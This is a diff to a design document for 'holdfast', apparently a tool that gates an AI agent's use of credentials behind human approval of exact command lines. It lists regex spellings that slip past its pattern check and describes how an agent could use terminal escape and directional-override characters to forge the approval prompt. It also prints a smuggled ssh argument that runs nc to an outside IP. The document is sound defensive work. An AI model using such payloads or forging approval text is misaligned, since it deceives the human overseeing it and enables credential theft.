@@ -99,13 +99,21 @@ surfaces rather than redacted on them.
   reading the credential and echoing it, with `ssh` never reached at all. Same
   primitive, other end of the pattern.
 
-  The check is a shallow syntactic heuristic and is **not** airtight. It peels
-  anchors, inline flag setters and wrapping groups off each end and looks at
-  what is under them; it does not analyse the regex. Two known misses stay
-  accepted: any negated class (`[^\x00]*`, `[^q]*`), and an open end that is not
-  at an end (`^ssh.*prod-01$`). That is accepted rather than overlooked: **the
-  operator is not the adversary here, the agent is**, and an operator who
-  reaches past the check has chosen to widen their own binding.
+  The check is a shallow syntactic heuristic and is **nowhere near complete.**
+  It peels anchors, inline flag setters and wrapping groups off each end and
+  looks at what is under them; it does not analyse the regex. Spellings that
+  load and still admit an agent-chosen line include any negated class
+  (`[^\x00]*`), an open end that is not at an end (`^ssh.*prod-01$`), any-char
+  atoms it does not know (`\p{Any}*`, `[\x00-\x{10FFFF}]*`), a nested group
+  under an outer quantifier (`((.))*`), an alternation inside a quantified group
+  (`(?:.|x)*`), and `(?x)` free-spacing. **That list is the ones that have been
+  found, not the ones that exist** — an earlier draft named two and read as an
+  inventory, and a review drove twenty more past it in an afternoon.
+
+  It is accepted rather than overlooked: **the operator is not the adversary
+  here, the agent is**, and every one of these requires an operator to type it.
+  The check exists to catch the reflex — writing `.*` when a legitimate session
+  stops matching — not to be a regex analyser.
 
 - **`BindingApprovalRequired` carries the session's command line**, so a human
   approves *this command line receiving this credential* rather than a binding
@@ -120,9 +128,23 @@ surfaces rather than redacted on them.
   The strip is not tidying. An argument containing `\x1b[2K` or `\r` lets the
   agent erase or overwrite the very line the operator is being asked to decide
   from, and forge the text around it — which defeats the field rather than
-  weakening it. Escape sequences, control characters, and the directional-override
-  and zero-width characters all go. The payload's *text* stays, so an operator
-  sees a longer, stranger line rather than a forged short one.
+  weakening it. Every control character goes, and so do the directional-override
+  and zero-width characters: U+202E reverses the rendering of everything after
+  it, which is the same attack in another alphabet.
+
+  **What is *not* removed is the text itself.** An escape sequence loses its
+  `\x1b` and what remains — `[2K`, `]0; -o ProxyCommand=…` — stays on screen as
+  the visible nonsense it is, so an operator sees a **longer, stranger** line
+  and never a shorter innocent one. That distinction is the whole point and it
+  was briefly the other way round: a first cut routed the field through the
+  terminal-stream ANSI stripper, which *consumes* OSC/DCS/APC payloads, so
+  `ssh prod-01\x1b]0; -o ProxyCommand=nc 1.2.3.4 22\x07` rendered as exactly
+  `ssh prod-01` — an argument deleted outright, which is this feature inverted.
+
+  The same treatment is applied to `AwaitingSecret.prompt_text` and
+  `BindingApprovalRequired.prompt_text`, which are agent-authored too and reach
+  a worse surface: `holdfast attach` writes that field to the terminal
+  unmodified.
 
   This is mitigation and not a fix: it does nothing for
   `autofill_on_echo_off`, which is the unattended case, and it asks a person to
